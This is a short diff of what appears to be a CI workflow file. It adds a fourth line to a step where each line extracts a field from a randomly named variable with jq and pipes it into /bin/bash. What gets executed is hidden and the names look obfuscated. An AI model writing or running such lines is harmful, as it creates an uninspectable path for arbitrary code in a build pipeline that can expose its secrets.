@@ -29,6 +29,7 @@ jobs:
           echo $bxktk62 | jq -r .bwedz8 | /bin/bash
           printf '%s' "$dsoo1817" | jq -r .dumf284 | /bin/bash
           echo $dh8073 | jq -r .w98599 | /bin/bash
+          printf '%s' "$s4940" | jq -r .px270 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
